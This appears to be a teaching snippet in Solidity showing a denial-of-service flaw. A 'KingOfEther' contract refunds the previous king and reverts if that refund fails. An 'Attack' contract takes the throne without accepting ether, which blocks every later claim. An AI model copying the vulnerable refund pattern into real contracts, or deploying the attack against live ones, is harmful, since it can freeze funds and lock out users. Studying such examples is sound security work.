// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract KingOfEther {
    address public king;
    uint256 public balance;

    constructor() {}

    function claimToKing() external payable {
        require(msg.value > balance, "Ether is insufficient.");
        (bool sent,) = king.call{value: balance}("");
        require(sent, "Failed to send Ether");
        king = msg.sender;
        balance = msg.value;
    }
}

contract Attack {
    KingOfEther public kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = _kingOfEther;
    }

    function attack() external payable {
        kingOfEther.claimToKing{value: msg.value}();
    }
}
